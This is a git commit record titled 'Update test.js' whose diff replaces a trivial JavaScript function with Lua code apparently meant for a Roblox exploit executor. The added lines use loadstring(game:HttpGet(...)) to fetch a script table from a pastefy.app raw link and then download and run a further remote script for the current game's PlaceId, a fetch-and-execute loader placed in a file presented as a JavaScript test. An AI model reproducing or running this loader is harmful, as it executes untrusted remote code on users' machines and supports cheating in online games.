ccba19d113361074b3886c6d3baee3cceb40b37b
githuscripter <wiselydulay77@gmail.com>
2025-07-20 19:09:38 +0800

    Update test.js

--- functions/bar/test.js
+++ functions/bar/test.js
@@ -1,4 +1,7 @@
-function foo() {
-  console.log('hisdfsdfwefsdsdfsfesdfsd');
-}
-export default foo;
+local Games = loadstring(game:HttpGet("https://pastefy.app/FjEUTL2K/raw"))()
+
+for PlaceID, Execute in pairs(Games) do
+    if PlaceID == game.PlaceId then
+        loadstring(game:HttpGet(Execute))()
+    end
+end
